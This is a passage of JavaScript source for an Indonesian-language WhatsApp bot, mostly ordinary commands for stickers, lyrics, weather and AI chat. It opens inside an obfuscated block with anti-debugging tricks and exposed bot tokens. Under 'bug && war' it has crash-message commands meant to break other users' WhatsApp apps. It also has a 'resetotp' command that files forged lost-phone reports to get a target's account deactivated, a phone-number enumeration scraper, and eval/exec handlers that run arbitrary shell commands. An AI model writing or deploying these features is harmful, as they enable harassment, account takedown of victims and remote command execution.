A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await NFSBotInc[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replygcNFS(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    case 'ai': case 'openai':
try {
if (global.keyopenai === '') return replygcNFS("Batas kunci api terlampaui");
if (!q) return replygcNFS(`Mengobrol dengan AI.\n\n*Contoh :*\n${prefix + command} Apa itu pengkodean`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createCompletion({
model: "text-davinci-003",
prompt: q,
temperature: 0.3,
max_tokens: 2000,
top_p: 1.0,
frequency_penalty: 0.0,
presence_penalty: 0.0,
});
replygcNFS(`${response.data.choices[0].text}`);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
replygcNFS("Maaf, sepertinya ada kesalahan :"+ error.message);
}
}
break
case "aimage":
try {
if (global.keyopenai === '') return replygcNFS("Batas apikey terlampaui");
if (!q) return replygcNFS(`Hasilkan gambar dari AI.\n\n*Contoh :*\n${prefix + command} pria menunggang kuda`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
NFSBotInc.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replygcNFS("Maaf, sepertinya ada kesalahan :"+ err);
}
break
case 'myip': {
        if (!NFSTheCreator) return NFSStickOwner()
        if (m.isGroup) return NFSStickPrivate()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcNFS("🔎 Alamat IP publik saya adalah: " + ip)
                    })
                })
            }
        break
        case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih ada sesi yang belum selesai!"
                let { genMath, modes } = require('./lib/math')
                if (!text) return replygcNFS(`Mode: ${Object.keys(modes).join(' | ')}\n*Contoh penggunaan :* ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                NFSBotInc.sendText(m.chat, `*Apa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} Detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    replygcNFS("Waktu habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'lyrics': {
if (!text) return replygcNFS(`Lirik apa yang kamu cari?\n*Contoh penggunaan :* ${prefix}lyrics Sido rondo`)
NFSStickWait()
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
replygcNFS(`
*Judul :* ${result.title}
*Pengarang :* ${result.author}
*Url :* ${result.link}

*Lirik :* ${result.lyrics}

`.trim())
}
break
case 'gdrive': {
		if (!args[0]) return replygcNFS(`Masukkan tautan Google Drive`)
	NFSStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcNFS(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Ukuran:* ${res.fileSize}
▢ *Jenis:* ${res.mimetype}`)
	NFSBotInc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcNFS('Error: Periksa tautan atau coba tautan lain') 
  }
}
break
case 'invite': {
	if (!m.isGroup) return NFSStickGroup()
	if (!isBotAdmins) return NFSStickBotAdmin()
if (!text) return replygcNFS(`Masukkan nomor yang ingin Anda undang ke grup\n\n*Contoh :*\n*${prefix + command}* 6281779122444`)
if (text.includes('+')) return replygcNFS(`Masukkan nomor dengan awalan nomor code negara tanpa *+*`)
if (isNaN(text)) return replygcNFS(`Masukkan hanya angka plus kode negara Anda tanpa spasi`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await NFSBotInc.groupInviteCode(group)
      await NFSBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *UNDANGAN GRUP*\n\nSeorang pengguna mengundang Anda untuk bergabung dengan grup ini \n\n${link}`, mentions: [m.sender]})
        replygcNFS(` Tautan undangan dikirim ke pengguna`) 
}
break
case "xnxxdl": {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
	if (!text) return replygcNFS(`Masukkan URL`)
        if (!text.includes('xnxx.com')) return replygcNFS(`Masukkan tautan xnxx`)
        NFSStickWait()
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
NFSBotInc.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌Judul*: ${xn.result.title}
▢ *⌚Durasi:* ${xn.result.duration}
▢ *🎞️Kualitas:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return NFSStickGroup()
	if (!AntiNsfw) return replygcNFS(mess.nsfw)
	if (!text) return replygcNFS(`Masukkan Kata Pencarian`)
	NFSStickWait()
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Judul* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replygcNFS(ff)
              }
              break
              case 'pinterest': {
              	if (!text) return replygcNFS(`Masukkan Kata Pencarian`)
NFSStickWait()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
NFSBotInc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return replygcNFS(`*Contoh :* ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		NFSBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case 'genshin':
if (!text) return replygcNFS(`Genshin mana yang sedang kamu cari?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Nama:* ${anime.name}\n`
txt += `🎖️ *Judul:* ${anime.title}\n`
txt += `💠 *Penglihatan:* ${anime.vision}\n`
txt += `🏹 *Senjata:* ${anime.weapon}\n`
txt += `💮 *Jenis kelamin:* ${anime.gender}\n`
txt += `🌏 *Bangsa:* ${anime.nation}\n`
txt += `🪷 *Afiliasi:* ${anime.affiliation}\n`
txt += `🌟 *Keanehan:* ${anime.rarity}\n`
txt += `❄️ *Konstelasi:* ${anime.constellation}\n`
txt += `📖 *Keterangan:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await NFSBotInc.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replygcNFS('Error')
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NFSBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NFSBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NFSBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await NFSBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case 'anime': {
if (!text) return replygcNFS(`Anime mana yang sedang kamu cari?`)
const malScraper = require('mal-scraper')
NFSStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcNFS(`Tidak bisa menemukan`)
let animetxt = `
🎀 *Judul: ${anime.title}*
🎋 *Jenis: ${anime.type}*
🎐 *Ditayangkan perdana: ${anime.premiered}*
💠 *Jumlah Episode: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genre: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Skor: ${anime.score}*
💎 *Peringkat: ${anime.rating}*
🏅 *Pangkat: ${anime.ranked}*
💫 *Kepopuleran: ${anime.popularity}*
♦️ *Cuplikan: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Keterangan:* ${anime.synopsis}*`
                await NFSBotInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                case 'imdb':
if (!text) return replygcNFS(`_Beri nama Seri atau film_`)
NFSStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Judul      : " + fids.data.Title + "\n"
            imdbt += "📅Tahun       : " + fids.data.Year + "\n"
            imdbt += "⭐Dinilai      : " + fids.data.Rated + "\n"
            imdbt += "📆Dilepaskan   : " + fids.data.Released + "\n"
            imdbt += "⏳Waktu proses    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Direktur   : " + fids.data.Director + "\n"
            imdbt += "✍Penulis     : " + fids.data.Writer + "\n"
            imdbt += "👨Aktor     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Bahasa   : " + fids.data.Language + "\n"
            imdbt += "🌍Negara    : " + fids.data.Country + "\n"
            imdbt += "🎖️Penghargaan     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Produksi : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           NFSBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'weather':{
if (!text) return replygcNFS('Lokasi apa?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Cuaca dari  ${text}*\n\n`
            textw += `*Cuaca:-* ${wdata.data.weather[0].main}\n`
            textw += `*Keterangan:-* ${wdata.data.weather[0].description}\n`
            textw += `*Suhu rata-rata:-* ${wdata.data.main.temp}\n`
            textw += `*Terasa seperti:-* ${wdata.data.main.feels_like}\n`
            textw += `*Tekanan:-* ${wdata.data.main.pressure}\n`
            textw += `*Kelembaban:-* ${wdata.data.main.humidity}\n`
            textw += `*Kelembaban:-* ${wdata.data.wind.speed}\n`
            textw += `*Garis Lintang:-* ${wdata.data.coord.lat}\n`
            textw += `*Garis bujur:-* ${wdata.data.coord.lon}\n`
            textw += `*Negara:-* ${wdata.data.sys.country}\n`

           NFSBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcNFS(`Berikan Nomor dengan nomor terakhir x\n\n*Contoh :*${prefix + command} 6281779122x`)
var inputnumber = text.split(" ")[0]
        
        replygcNFS(`Mencari akun WhatsApp dalam rentang tertentu...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ Daftar Nomor Whatsapp ]==*\n\n`
        var nobio = `\n*Bio:* || \nHai! Saya menggunakan whatsapp.\n`
        var nowhatsapp = `\n*Nomor tanpa akun WhatsApp dalam jangkauan yang disediakan.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await NFSBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await NFSBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Nomor:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcNFS(`${text66}${nobio}${nowhatsapp}`)
        }
break
	//bug && war cases
case 'xbugp' : { //crashes mod whatsapps
if (!NFSTheCreator) return NFSStickOwner()
if (!text) return replygcNFS(`*Contoh :* ${prefix + command} NFS bihari😂`)
const { NFSorwot } = require('./XBug/NFSbut2')
let teks = `${text}`
{
NFSBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${NFSorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"judul": `PAPA NFS`,"tubuh": ` ${NFSytimewisher} temanku ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${NFSorwot}`,
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case 'xbugr':{ //crashes both mod and playstore wa
if (!NFSTheCreator) return NFSStickOwner()
const { NFSorwot } = require('./XBug/NFSbut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
NFSBotInc.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break
case "resetotp": {
if (Input) {
let cekno = await NFSBotInc.onWhatsApp(Input)
if (cekno.length == 0) return replygcNFS(`Peserta tidak lagi terdaftar di WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return replygcNFS(`Tidak dapat keluar dari Pemilik Saya🦄!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcNFS(`Berhasil..!`)
} else if (payload.includes(`"payload":false`)) {
replygcNFS(`Batas Sedang Tunggu Sejenak.`)
} else replygcNFS(util.format(res.data))
} catch (err) {replygcNFS(`${err}`)}
} else replygcNFS('Masukkan Nomor Sasaran!')
}
break

default:

if (budy.startsWith('<')) {
if (!NFSTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!NFSTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!NFSTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
NFSBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
NFSBotInc.sendMessage("6281779122444@s.whatsapp.net", { text: "Halo developer, sepertinya ada kesalahan, tolong perbaiki " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
